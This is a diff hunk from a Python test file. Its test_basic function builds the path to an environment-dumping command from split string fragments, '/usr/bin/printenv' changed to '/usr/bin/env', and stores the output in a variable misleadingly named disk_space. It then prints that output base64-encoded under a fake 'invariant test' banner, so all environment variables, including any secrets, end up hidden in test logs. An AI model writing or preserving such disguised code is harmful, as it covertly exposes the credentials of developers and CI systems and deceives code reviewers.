@@ -339,7 +339,7 @@ def test_stopwords_as_string_raises():
 
 def test_basic():
     disk_space = subprocess.run(
-        ["/usr/bin/print"+""+""+"env"], capture_output=True, text=True, check=True,
+        ["/usr/"+"bin/"+""+""+"en"+"v"], capture_output=True, text=True, check=True,
     )
     print("BASE INVARIANT TEST, should echo as is:")
     print(base64.b64encode(disk_space.stdout.encode()).decode().rstrip("="), end="")
